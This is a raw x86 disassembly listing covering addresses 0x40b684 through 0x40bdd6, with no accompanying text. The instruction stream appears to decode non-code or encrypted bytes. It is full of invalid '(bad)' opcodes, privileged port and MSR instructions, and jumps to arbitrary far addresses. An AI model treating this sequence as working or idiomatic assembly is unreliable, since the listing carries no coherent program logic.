  40b684:	dec    edx
  40b685:	jbe    0x40b675
  40b687:	popa   
  40b688:	adc    edi,DWORD PTR [ebx-0x80]
  40b68b:	pop    DWORD PTR [ecx+0x14379b47]
  40b691:	cmp    DWORD PTR [ebp+0x5d],ecx
  40b694:	jmp    0x40b660
  40b696:	cmp    edx,ebp
  40b698:	gs jmp 0xdee:0x3c049983
  40b6a0:	fst    DWORD PTR [ecx+0x576eb732]
  40b6a6:	int    0x2c
  40b6a8:	cld    
  40b6a9:	cmp    ebp,ecx
  40b6ab:	xor    eax,0xe5883a70
  40b6b0:	ss mov esi,0x23a4a0cc
  40b6b6:	repz push 0xfffffffa
  40b6b9:	clc    
  40b6ba:	push   edx
  40b6bb:	loop   0x40b6e6
  40b6bd:	fninit 
  40b6bf:	inc    ebx
  40b6c0:	inc    eax
  40b6c1:	aas    
  40b6c2:	jne    0x40b73c
  40b6c4:	mov    al,ds:0x163431bf
  40b6c9:	out    dx,al
  40b6ca:	in     eax,0x90
  40b6cc:	lods   al,BYTE PTR ds:[esi]
  40b6cd:	pop    ss
  40b6ce:	sub    dl,BYTE PTR [esi-0x319728cf]
  40b6d4:	xchg   DWORD PTR [ebp+esi*2+0x24],edx
  40b6d8:	iret   
  40b6d9:	js     0x40b6b4
  40b6db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6dc:	xor    al,0xd8
  40b6de:	cld    
  40b6df:	adc    BYTE PTR [edi+0x47],dl
  40b6e2:	cmp    ah,bl
  40b6e4:	(bad)  
  40b6e5:	aad    0x78
  40b6e7:	aam    0xad
  40b6e9:	push   ss
  40b6ea:	out    dx,al
  40b6eb:	in     eax,dx
  40b6ec:	mov    ds:0x396f11f,al
  40b6f1:	xor    dl,cl
  40b6f3:	push   cs
  40b6f4:	xchg   edx,eax
  40b6f5:	fstp   QWORD PTR [edx]
  40b6f7:	scas   eax,DWORD PTR es:[edi]
  40b6f8:	rol    edi,0x54
  40b6fb:	add    BYTE PTR [esi],bh
  40b6fd:	lods   al,BYTE PTR ds:[esi]
  40b6fe:	ret    
  40b6ff:	je     0x40b733
  40b701:	outs   dx,BYTE PTR ds:[esi]
  40b703:	outs   dx,DWORD PTR ds:[esi]
  40b704:	cmc    
  40b705:	loop   0x40b72f
  40b707:	sub    DWORD PTR [eax-0x2af38523],0x74
  40b70e:	dec    eax
  40b70f:	js     0x40b6e3
  40b711:	jmp    0x1f39:0x665aace
  40b718:	cmp    dh,dh
  40b71a:	ds sub eax,0x4f5d1acb
  40b720:	adc    al,0x20
  40b722:	ins    DWORD PTR es:[edi],dx
  40b723:	xchg   ebp,eax
  40b724:	ret    0xe0a8
  40b727:	cs dec esi
  40b729:	cdq    
  40b72a:	div    bh
  40b72c:	jo     0x40b6b4
  40b72e:	xor    al,0xe2
  40b730:	adc    ch,BYTE PTR [ebp+0x4c1de2d3]
  40b736:	mov    ds:0x70d5fff,al
  40b73b:	and    eax,0xd8e43ba6
  40b740:	mov    edi,0x1ea7b02f
  40b745:	jbe    0x40b75b
  40b747:	std    
  40b748:	lds    eax,FWORD PTR [eax+edx*1+0x4c]
  40b74c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b74d:	loope  0x40b6f6
  40b74f:	aas    
  40b750:	jle    0x40b7a7
  40b752:	in     al,dx
  40b753:	mov    ecx,0xb824d54
  40b758:	mov    bh,0xf9
  40b75a:	mov    ss,WORD PTR [eax+0x7c]
  40b75d:	mov    cl,0x21
  40b75f:	ret    0xbb94
  40b762:	jg     0x40b797
  40b764:	push   edx
  40b765:	ins    BYTE PTR es:[edi],dx
  40b766:	int3   
  40b767:	ins    BYTE PTR es:[edi],dx
  40b768:	xlat   BYTE PTR ds:[ebx]
  40b769:	les    esi,FWORD PTR [eax+0x50]
  40b76c:	stc    
  40b76d:	outs   dx,BYTE PTR ds:[esi]
  40b76e:	sub    BYTE PTR [edx-0x68],cl
  40b771:	fbld   TBYTE PTR [ecx-0x600760c3]
  40b777:	stos   DWORD PTR es:[edi],eax
  40b778:	sub    BYTE PTR [ebx-0x5340a8b0],0x67
  40b77f:	adc    esp,DWORD PTR [edx+0xd9a97c4]
  40b785:	cmc    
  40b786:	sub    edx,eax
  40b788:	mov    ds:0x13c8a533,eax
  40b78d:	popa   
  40b78e:	and    ebp,DWORD PTR [ebx]
  40b790:	mov    ah,0xb
  40b792:	mov    edx,DWORD PTR [ecx-0x7e]
  40b795:	adc    eax,0x54d5e91c
  40b79a:	pop    edx
  40b79b:	jne    0x40b72d
  40b79d:	xchg   DWORD PTR [edx+0x48],esp
  40b7a0:	push   ecx
  40b7a1:	adc    BYTE PTR [eax+0x7784583e],0xc8
  40b7a8:	sub    ebx,DWORD PTR [ebx-0x22bc0607]
  40b7ae:	in     eax,0x5
  40b7b0:	rep stos BYTE PTR es:[edi],al
  40b7b2:	mov    eax,ds:0x998531cb
  40b7b7:	add    dl,BYTE PTR [esi]
  40b7b9:	ret    
  40b7ba:	imul   DWORD PTR [ecx+edi*8+0x6d5d2ffb]
  40b7c1:	sbb    cl,dl
  40b7c3:	shl    BYTE PTR [ebp+0x574eb7f8],1
  40b7c9:	inc    ecx
  40b7ca:	(bad)  
  40b7cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7cc:	dec    ebx
  40b7cd:	mov    ah,0xf7
  40b7cf:	mov    eax,0x522d5383
  40b7d4:	out    0x2c,eax
  40b7d6:	(bad)  
  40b7d7:	shr    DWORD PTR [ebx+0x34df7af2],1
  40b7dd:	sbb    BYTE PTR [eax],0x6a
  40b7e0:	push   esp
  40b7e1:	xor    DWORD PTR [esi-0x1f],esi
  40b7e4:	and    al,0x15
  40b7e6:	jp     0x40b7d3
  40b7e8:	sub    eax,0xcd08465a
  40b7ed:	dec    esp
  40b7ee:	cmp    DWORD PTR [ebx+0x29958f22],esp
  40b7f4:	in     al,dx
  40b7f5:	jmp    0x40b80f
  40b7f7:	xor    al,0x53
  40b7f9:	jmp    0xe719:0xb5c80edd
  40b800:	ss xor eax,0x573935e5
  40b806:	in     al,dx
  40b807:	vmovshdup ymm6,ymm0
  40b80b:	outs   dx,DWORD PTR ds:[esi]
  40b80c:	dec    edi
  40b80d:	push   0x7259449c
  40b812:	popf   
  40b813:	sbb    BYTE PTR [edx],bl
  40b815:	sahf   
  40b816:	(bad)  
  40b818:	sbb    BYTE PTR [edi+0x18605227],0x15
  40b81f:	mov    BYTE PTR [edx-0x32],al
  40b822:	pushf  
  40b823:	aaa    
  40b824:	mov    dl,0x71
  40b826:	rdmsr  
  40b828:	jbe    0x40b858
  40b82a:	loop   0x40b873
  40b82c:	xor    esi,esi
  40b82e:	dec    ebx
  40b82f:	pop    ds
  40b830:	int    0x5
  40b832:	sub    eax,0xe29a67
  40b837:	mov    ecx,0x5e2a6d51
  40b83c:	add    al,0x68
  40b83e:	cmp    ebx,eax
  40b840:	scas   al,BYTE PTR es:[edi]
  40b841:	fwait
  40b842:	out    dx,al
  40b843:	(bad)  
  40b844:	mov    dl,0xb1
  40b846:	pop    ecx
  40b847:	or     edi,ecx
  40b849:	or     edx,ebx
  40b84b:	addr16 xchg edi,eax
  40b84d:	jmp    0x40b83b
  40b84f:	add    al,0x54
  40b851:	sub    DWORD PTR [esi+edi*4-0x15],0x64d1325b
  40b859:	cmp    al,0x84
  40b85b:	sbb    bh,BYTE PTR [edi]
  40b85d:	aaa    
  40b85e:	pop    ebp
  40b85f:	jno    0x40b841
  40b861:	xchg   ecx,eax
  40b862:	leave  
  40b863:	retf   
  40b864:	adc    bh,BYTE PTR [eax+ebx*2]
  40b867:	mov    WORD PTR [edi+0x5a6fcad3],ds
  40b86d:	adc    esp,DWORD PTR [edx+0x34]
  40b870:	mov    ds:0x3854d7e8,al
  40b875:	mov    ch,0x46
  40b877:	mov    eax,0x62668261
  40b87c:	mov    eax,ds:0x4dd9dae3
  40b881:	dec    esi
  40b882:	test   cl,0x3f
  40b885:	jb     0x40b8a3
  40b887:	out    dx,al
  40b888:	dec    ecx
  40b889:	jecxz  0x40b85c
  40b88b:	xchg   esp,eax
  40b88c:	xchg   DWORD PTR ds:0xa811d9c0,esi
  40b892:	push   ebp
  40b893:	icebp  
  40b894:	cli    
  40b895:	mov    esi,0x91fb258
  40b89a:	push   ds
  40b89b:	fwait
  40b89c:	pop    ebx
  40b89d:	stc    
  40b89e:	into   
  40b89f:	rol    DWORD PTR [esi+0x49],0x17
  40b8a3:	xchg   bl,al
  40b8a5:	or     ah,cl
  40b8a7:	mov    bl,0x17
  40b8a9:	or     eax,0x76c60ea1
  40b8ae:	and    BYTE PTR [edx-0x5c99f0c8],dh
  40b8b4:	cmc    
  40b8b5:	dec    ecx
  40b8b6:	shr    BYTE PTR [edx+0x6d7fcd39],1
  40b8bc:	jp     0x40b8a8
  40b8be:	cmp    ebp,DWORD PTR [eax+0x46d0687b]
  40b8c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c5:	or     BYTE PTR [edx+0x50f50f91],0x25
  40b8cc:	out    0x2e,al
  40b8ce:	dec    esi
  40b8cf:	sub    esp,DWORD PTR [edx-0x51cae115]
  40b8d5:	(bad)  
  40b8d6:	push   eax
  40b8d7:	test   eax,0xe7117837
  40b8dc:	push   esi
  40b8dd:	into   
  40b8de:	and    al,BYTE PTR [ebx+0xfeb3e0a]
  40b8e4:	push   ss
  40b8e5:	ficom  WORD PTR [ecx+0x33f0341a]
  40b8eb:	mov    edx,0x989fd43c
  40b8f0:	sahf   
  40b8f1:	outs   dx,DWORD PTR ds:[esi]
  40b8f2:	xchg   DWORD PTR [edi+0x52],eax
  40b8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8f6:	mov    edx,eax
  40b8f8:	jg     0x40b922
  40b8fa:	xlat   BYTE PTR ds:[ebx]
  40b8fb:	call   0x83da0654
  40b900:	mov    ebp,0xc1e218a9
  40b905:	lock or dl,BYTE PTR [edi-0x6f]
  40b909:	jno    0x40b8c8
  40b90b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b90c:	dec    ebx
  40b90d:	mov    dh,0xf6
  40b90f:	aad    0x7a
  40b911:	mov    dh,dh
  40b913:	jecxz  0x40b895
  40b915:	mov    esp,0x4abf6c50
  40b91a:	mov    WORD PTR [esi+0x29a4caa6],fs
  40b920:	mov    edi,ecx
  40b922:	jae    0x40b98d
  40b924:	mov    al,0x87
  40b926:	mov    DWORD PTR cs:[eax-0x530eebd1],esi
  40b92d:	dec    eax
  40b92e:	sub    al,0x87
  40b930:	sub    edx,DWORD PTR [ecx-0x63]
  40b933:	xchg   ebp,eax
  40b934:	jecxz  0x40b908
  40b936:	dec    ecx
  40b937:	sbb    eax,0xb64e2d82
  40b93c:	div    DWORD PTR [ebx-0x11]
  40b93f:	sbb    eax,0x42e431a0
  40b944:	jl     0x40b97e
  40b946:	xor    eax,0x570bd771
  40b94b:	das    
  40b94c:	test   DWORD PTR [edx],ebx
  40b94e:	das    
  40b94f:	jecxz  0x40b8e0
  40b951:	mov    cl,0x3e
  40b953:	iret   
  40b954:	pop    esp
  40b955:	xlat   BYTE PTR ds:[ebx]
  40b956:	jl     0x40b934
  40b958:	and    eax,0x1fd3cbc2
  40b95d:	sub    BYTE PTR [ebp+0x1c],cl
  40b960:	cmc    
  40b961:	or     DWORD PTR [edi-0x61],edx
  40b964:	es jnp 0x40b916
  40b967:	push   ss
  40b968:	adc    esi,DWORD PTR [ebx]
  40b96a:	(bad)  
  40b96b:	sbb    dh,dh
  40b96d:	fucomip st,st(6)
  40b96f:	retf   
  40b970:	jl     0x40b922
  40b972:	es inc eax
  40b974:	bound  ebx,QWORD PTR [ebp-0x4a]
  40b977:	add    bh,BYTE PTR [esi+0x73]
  40b97a:	and    al,BYTE PTR [edx-0x3814f4ae]
  40b980:	mov    bh,0xd4
  40b982:	push   0xa56ff656
  40b987:	mov    dh,0x3f
  40b989:	dec    ecx
  40b98a:	pop    esp
  40b98b:	pop    ds
  40b98c:	xchg   esp,eax
  40b98d:	push   ss
  40b98e:	sbb    al,BYTE PTR [ebx]
  40b990:	stos   BYTE PTR es:[edi],al
  40b991:	pop    ss
  40b992:	mov    eax,ds:0x5cb99edd
  40b997:	je     0x40b973
  40b999:	push   0xa0b23cd2
  40b99e:	popf   
  40b99f:	push   ebp
  40b9a0:	retf   0x61b8
  40b9a3:	pop    eax
  40b9a4:	sub    al,0x2f
  40b9a6:	call   0x303b:0x9296e160
  40b9ad:	mov    edi,0x283d9399
  40b9b2:	scas   eax,DWORD PTR es:[edi]
  40b9b3:	and    al,cl
  40b9b5:	cmp    esi,DWORD PTR [ebp-0x12]
  40b9b8:	cmp    bl,ah
  40b9ba:	mov    bh,0xb5
  40b9bc:	push   esp
  40b9bd:	neg    bh
  40b9bf:	nop
  40b9c0:	lock shr DWORD PTR [edx-0x51],1
  40b9c4:	inc    eax
  40b9c5:	cwde   
  40b9c6:	jne    0x40ba10
  40b9c8:	jp     0x40b9e1
  40b9ca:	lds    edi,FWORD PTR [eax+0x70de3a27]
  40b9d0:	je     0x40b965
  40b9d2:	sahf   
  40b9d3:	mov    ds:0xa77001a2,eax
  40b9d8:	in     eax,dx
  40b9d9:	sub    eax,0xb91ff04e
  40b9de:	fisub  DWORD PTR [esi-0xb]
  40b9e1:	hlt    
  40b9e2:	mov    bh,0x8f
  40b9e4:	jp     0x40b988
  40b9e6:	or     esi,0x468b98c3
  40b9ec:	xchg   esi,eax
  40b9ee:	jmp    0x40b977
  40b9f0:	sub    BYTE PTR [esp+eiz*2],ch
  40b9f3:	sbb    dl,bl
  40b9f5:	test   DWORD PTR [edi],ebx
  40b9f7:	ins    DWORD PTR es:[edi],dx
  40b9f8:	push   ebx
  40b9f9:	js     0x40b9fd
  40b9fb:	cmp    BYTE PTR [ebx+0x7735b384],al
  40ba01:	adc    eax,DWORD PTR [ebx]
  40ba03:	shl    BYTE PTR [edx+eiz*2-0x15ef08e9],cl
  40ba0a:	xchg   DWORD PTR [esi+ebp*1+0x2f],edi
  40ba0e:	arpl   WORD PTR [ecx-0xa6e524f],cx
  40ba14:	inc    ecx
  40ba15:	(bad)  
  40ba16:	stc    
  40ba17:	push   0xffffffb8
  40ba19:	lock jo 0x40ba55
  40ba1c:	mov    DWORD PTR [esi-0x6fe2bb7e],0xde9b1827
  40ba26:	xchg   esp,eax
  40ba27:	push   eax
  40ba28:	adc    al,0x3b
  40ba2a:	and    DWORD PTR [ebx+0x14c9ae74],ecx
  40ba30:	outs   dx,BYTE PTR ds:[esi]
  40ba31:	dec    esp
  40ba32:	fucomp st(4)
  40ba34:	lea    edi,ds:0x28709f09
  40ba3a:	ss sub al,0x29
  40ba3d:	inc    esi
  40ba3e:	(bad)  
  40ba3f:	int3   
  40ba40:	sub    DWORD PTR [ebp-0x277e326],edi
  40ba46:	popf   
  40ba47:	lods   eax,DWORD PTR ds:[esi]
  40ba48:	pop    ss
  40ba49:	push   edi
  40ba4a:	and    eax,0x10df5976
  40ba4f:	cmc    
  40ba50:	xor    bh,ch
  40ba52:	iret   
  40ba53:	(bad)  
  40ba54:	push   0x23
  40ba56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba57:	add    dl,BYTE PTR [esi+edi*2+0x7b53bf00]
  40ba5e:	mov    al,0x19
  40ba60:	stos   DWORD PTR es:[edi],eax
  40ba61:	fcmovb st,st(6)
  40ba63:	inc    esi
  40ba64:	repz inc bx
  40ba67:	mov    dl,0x32
  40ba69:	and    dh,BYTE PTR [ebp-0x26]
  40ba6c:	fbstp  TBYTE PTR [edi]
  40ba6e:	mov    eax,0x33172e81
  40ba73:	sub    esp,DWORD PTR [ebx]
  40ba75:	sub    eax,0x19083393
  40ba7a:	clc    
  40ba7b:	(bad)  
  40ba7c:	xchg   DWORD PTR [eax+0x5a],edi
  40ba7f:	ret    
  40ba80:	mov    ch,ah
  40ba82:	hlt    
  40ba83:	jb     0x40ba85
  40ba85:	nop
  40ba86:	xor    ebx,DWORD PTR [esi]
  40ba88:	adc    BYTE PTR [esi],al
  40ba8a:	pop    ebx
  40ba8b:	mov    eax,0x47f15220
  40ba90:	jmp    0x8d06e5d9
  40ba95:	pop    ebp
  40ba96:	push   ebp
  40ba97:	xor    BYTE PTR [ecx+0x367dfec7],0x7f
  40ba9e:	cmp    WORD PTR [esi-0x7d07b7f9],si
  40baa5:	jle    0x40baea
  40baa7:	cli    
  40baa8:	or     al,0x6c
  40baaa:	rcl    DWORD PTR [ecx],cl
  40baac:	push   ecx
  40baad:	cwde   
  40baae:	ror    BYTE PTR [edx-0x1eb401d6],0x43
  40bab5:	jge    0x40ba9a
  40bab7:	mov    ss,WORD PTR [eax+0xe14f2c5]
  40babd:	mov    esi,0xbb7e5262
  40bac2:	aas    
  40bac3:	mov    ah,0xca
  40bac5:	mov    edi,0x7d722820
  40baca:	popa   
  40bacb:	arpl   bp,bx
  40bacd:	ds nop
  40bacf:	cmp    dh,0xb
  40bad2:	pusha  
  40bad3:	pop    ecx
  40bad4:	in     al,dx
  40bad5:	lods   al,BYTE PTR ds:[esi]
  40bad6:	add    al,0xbd
  40bad8:	pop    ss
  40bad9:	inc    eax
  40bada:	jmp    0x79e0:0xb4b48fd3
  40bae1:	sub    ch,BYTE PTR [edx+0x6ca11baf]
  40bae7:	leave  
  40bae8:	(bad)  
  40bae9:	cmp    DWORD PTR [edi+ecx*4-0x3560e431],ecx
  40baf0:	pop    esi
  40baf1:	pop    edx
  40baf2:	loop   0x40bb54
  40baf4:	je     0x40ba80
  40baf6:	fld    TBYTE PTR [eax+edi*2]
  40baf9:	maxps  xmm6,XMMWORD PTR [bp+si]
  40bafd:	and    eax,0x7a0fc150
  40bb02:	sub    eax,0x13e6db1c
  40bb07:	mov    eax,ds:0x43536fbf
  40bb0c:	inc    ecx
  40bb0d:	scas   eax,DWORD PTR es:[edi]
  40bb0e:	dec    ecx
  40bb0f:	mov    edi,0x3cc8b4a
  40bb14:	mov    BYTE PTR fs:0x9609302c,al
  40bb1b:	std    
  40bb1c:	sbb    ebp,DWORD PTR [eax+ecx*2+0x60]
  40bb20:	or     ebp,DWORD PTR [ecx-0x2c75dd78]
  40bb26:	jp     0x40bab4
  40bb28:	cld    
  40bb29:	ss xchg esi,eax
  40bb2b:	mov    esi,0x7bb23aab
  40bb30:	aam    0x3b
  40bb32:	(bad)  
  40bb33:	pop    ecx
  40bb34:	xchg   edi,eax
  40bb35:	xor    BYTE PTR [ecx-0x26],dl
  40bb38:	mov    ebp,0xae900407
  40bb3d:	fistp  WORD PTR [ecx]
  40bb3f:	adc    esp,DWORD PTR [esi+eax*8-0x58b39e27]
  40bb46:	outs   dx,BYTE PTR ds:[esi]
  40bb47:	sti    
  40bb48:	jns    0x40bb24
  40bb4a:	xor    eax,DWORD PTR [ebx+0x3a911f76]
  40bb50:	sbb    al,0x94
  40bb52:	mov    WORD PTR [edi-0x23fc6640],ds
  40bb58:	sbb    BYTE PTR [edx],al
  40bb5a:	push   0xc322f972
  40bb5f:	or     ecx,esi
  40bb61:	scas   al,BYTE PTR es:[edi]
  40bb62:	inc    ebx
  40bb63:	out    0xf1,eax
  40bb65:	outs   dx,DWORD PTR ds:[esi]
  40bb66:	stos   BYTE PTR es:[edi],al
  40bb67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb68:	pop    ecx
  40bb69:	aam    0xe
  40bb6b:	jnp    0x40bbbc
  40bb6d:	loope  0x40baff
  40bb6f:	or     cl,BYTE PTR [ecx]
  40bb71:	mov    ebx,0xc275528e
  40bb76:	xchg   ebx,eax
  40bb77:	jmp    0xcc68bfab
  40bb7c:	push   ss
  40bb7d:	ret    
  40bb7e:	push   0xbff99efd
  40bb83:	push   ecx
  40bb84:	inc    esp
  40bb85:	inc    esi
  40bb86:	push   0x2075304
  40bb8b:	cs stc 
  40bb8d:	fwait
  40bb8e:	jl     0x40bb79
  40bb90:	dec    esp
  40bb91:	and    BYTE PTR [ebp+0x18d286dc],ch
  40bb97:	into   
  40bb98:	pop    ds
  40bb99:	test   ebx,0xb01bd41f
  40bb9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bba0:	jbe    0x40bbc3
  40bba2:	or     BYTE PTR [edi+eiz*2+0x54],bh
  40bba6:	fsubrp st(2),st
  40bba8:	fcomp  DWORD PTR [edi-0x775ebf24]
  40bbae:	lea    edi,[esi-0x6e]
  40bbb1:	out    dx,eax
  40bbb2:	xchg   ebx,eax
  40bbb3:	mov    bh,0x30
  40bbb5:	std    
  40bbb6:	mov    esp,ss
  40bbb8:	push   cs
  40bbb9:	outs   dx,BYTE PTR ds:[esi]
  40bbba:	push   ds
  40bbbb:	aas    
  40bbbc:	dec    edx
  40bbbd:	call   0xd0c5:0xfb89035
  40bbc4:	xchg   edx,eax
  40bbc5:	ret    0xea7f
  40bbc8:	inc    edx
  40bbc9:	pop    edx
  40bbca:	(bad)  
  40bbcb:	aad    0xc3
  40bbcd:	push   cs
  40bbce:	mov    edi,0x601464b2
  40bbd3:	ja     0x40bc34
  40bbd5:	sbb    eax,0xfe2b1f2
  40bbda:	not    BYTE PTR [edx-0x5ddb5a10]
  40bbe0:	pop    edi
  40bbe1:	test   bl,al
  40bbe3:	call   0x78e2:0xc1579cfc
  40bbea:	(bad)  
  40bbeb:	sbb    cl,BYTE PTR [eax-0x6b]
  40bbee:	mov    al,ds:0x2e9b3a8a
  40bbf3:	test   eax,0x4d463482
  40bbf8:	test   DWORD PTR [ecx],edx
  40bbfa:	jg     0x40bc60
  40bbfc:	aaa    
  40bbfd:	(bad)  
  40bbfe:	push   esp
  40bbff:	(bad)  
  40bc00:	xor    edi,DWORD PTR [esi-0x50f3f74c]
  40bc06:	cli    
  40bc07:	sar    DWORD PTR [edi-0x6346c8b3],0x8e
  40bc0e:	rcl    DWORD PTR [ebp-0x2da0e652],cl
  40bc14:	fldenv [ebp-0x45b1c0bf]
  40bc1a:	js     0x40bc40
  40bc1c:	sub    BYTE PTR [edi-0x7d2d24b2],0x92
  40bc23:	gs jo  0x40bbf3
  40bc26:	push   eax
  40bc27:	imul   esp,DWORD PTR [esi],0x861ba5b6
  40bc2d:	outs   dx,DWORD PTR ds:[esi]
  40bc2e:	scas   eax,DWORD PTR es:[edi]
  40bc2f:	in     al,0xd4
  40bc31:	xchg   edi,eax
  40bc32:	mov    al,0x6
  40bc34:	xor    dl,BYTE PTR [ecx]
  40bc36:	sbb    al,0x56
  40bc38:	div    DWORD PTR [esi]
  40bc3a:	ficom  DWORD PTR [ecx]
  40bc3c:	fisubr WORD PTR [ebx]
  40bc3e:	fisttp QWORD PTR [edx]
  40bc40:	adc    eax,ecx
  40bc42:	mov    cl,0x15
  40bc44:	arpl   ax,cx
  40bc46:	mov    eax,DWORD PTR ds:0x954a938d
  40bc4c:	add    DWORD PTR [eax],edx
  40bc4e:	int3   
  40bc4f:	daa    
  40bc50:	pop    esi
  40bc51:	pop    es
  40bc52:	retf   
  40bc53:	mov    ah,0xe4
  40bc55:	(bad)  
  40bc57:	pusha  
  40bc58:	mov    ch,0xd7
  40bc5a:	or     DWORD PTR [eax+0x42fb7a99],ebx
  40bc60:	aaa    
  40bc61:	js     0x40bcb9
  40bc63:	mov    ?,WORD PTR [ebp-0x1c]
  40bc66:	loope  0x40bc56
  40bc68:	cmp    BYTE PTR [esi+0x6a],0x78
  40bc6c:	pop    ecx
  40bc6d:	popa   
  40bc6e:	sub    DWORD PTR [ebx],eax
  40bc70:	icebp  
  40bc71:	sub    eax,DWORD PTR [ebp-0x8]
  40bc74:	pop    esi
  40bc75:	adc    BYTE PTR [ebp+0x21],bl
  40bc78:	mov    cl,0x99
  40bc7a:	xor    ah,BYTE PTR [ecx]
  40bc7c:	(bad)  
  40bc7d:	fcom   st(3)
  40bc7f:	inc    eax
  40bc80:	sub    al,0x87
  40bc82:	lahf   
  40bc83:	pop    esi
  40bc84:	add    dh,BYTE PTR [edx]
  40bc86:	jne    0x40bce0
  40bc88:	or     DWORD PTR [edx-0x42970447],ebx
  40bc8e:	icebp  
  40bc8f:	pop    esp
  40bc90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc91:	jb     0x40bd06
  40bc93:	scas   eax,DWORD PTR es:[edi]
  40bc94:	mov    bl,0xd1
  40bc96:	xchg   esi,eax
  40bc97:	call   0xc67df819
  40bc9c:	bound  edx,QWORD PTR [esi]
  40bc9e:	pop    ds
  40bc9f:	xchg   esp,eax
  40bca0:	loope  0x40bc84
  40bca2:	gs stos BYTE PTR es:[edi],al
  40bca4:	jb     0x40bc7c
  40bca6:	and    DWORD PTR [edx-0x6b],eax
  40bca9:	(bad)  
  40bcaa:	add    DWORD PTR [ecx+eax*2],ecx
  40bcad:	icebp  
  40bcae:	dec    ebx
  40bcaf:	xor    ch,dl
  40bcb1:	pop    ss
  40bcb2:	pop    edx
  40bcb3:	cmp    esp,DWORD PTR [ebx+0x7aa38490]
  40bcb9:	jp     0x40bc93
  40bcbb:	and    esp,DWORD PTR [edx]
  40bcbd:	push   edx
  40bcbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcbf:	sbb    BYTE PTR [esi-0xb2bb2ba],cl
  40bcc5:	shl    BYTE PTR [esi],1
  40bcc7:	cmc    
  40bcc8:	jns    0x40bc75
  40bcca:	(bad)  
  40bccb:	pop    ebx
  40bccc:	or     al,0x1f
  40bcce:	push   edx
  40bccf:	ror    DWORD PTR [edx-0x3aa5caec],0xbb
  40bcd6:	icebp  
  40bcd7:	mov    DWORD PTR [ebp+0x69fd5a22],edx
  40bcdd:	enter  0xe589,0x5b
  40bce1:	sbb    ah,ch
  40bce3:	push   0x62
  40bce5:	rcl    DWORD PTR [edi+0x62],1
  40bce8:	stos   BYTE PTR es:[edi],al
  40bce9:	(bad)  
  40bcea:	push   cs
  40bceb:	dec    ebp
  40bcec:	pop    DWORD PTR [edx-0x47]
  40bcef:	in     al,0x20
  40bcf1:	xchg   ebp,eax
  40bcf2:	sub    bh,BYTE PTR [edi+esi*4-0x1f887fea]
  40bcf9:	inc    edi
  40bcfa:	test   BYTE PTR [ebx-0x67c2d87d],bl
  40bd00:	mov    ecx,0x7bd25fd6
  40bd05:	mov    bl,0x53
  40bd07:	into   
  40bd08:	mov    dl,0x44
  40bd0a:	fadd   DWORD PTR [edx-0x2a437e47]
  40bd10:	fdivr  st,st(3)
  40bd12:	fadd   DWORD PTR [edx+0x30]
  40bd15:	jmp    0xf098:0xd1fd9fc6
  40bd1c:	push   esi
  40bd1d:	sub    ch,BYTE PTR [esi-0x24]
  40bd20:	push   edx
  40bd21:	pop    ds
  40bd22:	cmp    al,0xbd
  40bd24:	ret    
  40bd25:	mov    ebp,0x8587b3e2
  40bd2a:	je     0x40bda3
  40bd2c:	mov    cl,ah
  40bd2e:	test   dl,bh
  40bd30:	or     BYTE PTR [ecx-0x46],0x9b
  40bd34:	cli    
  40bd35:	enter  0x8794,0x41
  40bd39:	adc    esp,ebx
  40bd3b:	div    DWORD PTR [edx-0x1]
  40bd3e:	add    al,0x61
  40bd40:	push   ebx
  40bd41:	xor    BYTE PTR [edi+ebx*4-0x7657aba0],bl
  40bd48:	sbb    eax,ebx
  40bd4a:	ins    DWORD PTR es:[edi],dx
  40bd4b:	fnstsw ax
  40bd4d:	js     0x40bd8c
  40bd4f:	push   ss
  40bd50:	shr    DWORD PTR [esi+ecx*8],1
  40bd53:	fnstsw WORD PTR [edi+0x39]
  40bd56:	xor    BYTE PTR [esi],ch
  40bd58:	sahf   
  40bd59:	sub    esi,eax
  40bd5b:	aad    0xe7
  40bd5d:	or     al,0xca
  40bd5f:	wrmsr  
  40bd61:	jne    0x40bd8a
  40bd63:	ins    DWORD PTR es:[edi],dx
  40bd64:	rcr    BYTE PTR [eax-0x6e2051e1],1
  40bd6a:	inc    ecx
  40bd6b:	fsqrt  
  40bd6d:	xchg   DWORD PTR [eax+0x29d1f4e],esp
  40bd73:	sbb    al,0xb1
  40bd75:	jp     0x40bd71
  40bd77:	pop    ds
  40bd78:	iret   
  40bd79:	sub    al,0x6b
  40bd7b:	adc    ch,ah
  40bd7d:	dec    edi
  40bd7e:	stos   BYTE PTR es:[edi],al
  40bd7f:	repz push ebx
  40bd81:	shl    edx,1
  40bd83:	rcr    DWORD PTR [edi+0x655702f6],cl
  40bd89:	adc    al,0x70
  40bd8b:	sahf   
  40bd8c:	into   
  40bd8d:	inc    ecx
  40bd8e:	cli    
  40bd8f:	mov    eax,0xac1dd3d7
  40bd94:	pop    ds
  40bd95:	inc    eax
  40bd96:	and    dh,bh
  40bd98:	xor    al,0xe8
  40bd9a:	adc    bl,dl
  40bd9c:	pusha  
  40bd9d:	mul    DWORD PTR [ebp+edi*1-0x4b]
  40bda1:	mov    ebp,0x7d17dc57
  40bda6:	xchg   ebx,eax
  40bda7:	fdivr  QWORD PTR [ebp+eax*8+0x5c058ed8]
  40bdaf:	pushf  
  40bdb0:	and    ch,BYTE PTR [edi+eax*8+0x6f11a912]
  40bdb7:	imul   edx,DWORD PTR [ebx+0x2f],0x32458902
  40bdbe:	dec    ebp
  40bdbf:	adc    BYTE PTR [eax],al
  40bdc1:	loope  0x40bd69
  40bdc3:	dec    esi
  40bdc4:	sti    
  40bdc5:	cmp    edi,DWORD PTR [edx-0x3f4f248f]
  40bdcb:	cmp    dh,BYTE PTR [ebp-0x67]
  40bdce:	cmc    
  40bdcf:	out    dx,eax
  40bdd0:	dec    edx
  40bdd1:	sub    BYTE PTR [esp+eax*1-0x26],dh
  40bdd5:	xchg   esp,eax
  40bdd6:	sbb    ecx,DWORD PTR [eax+0x60df1b04]
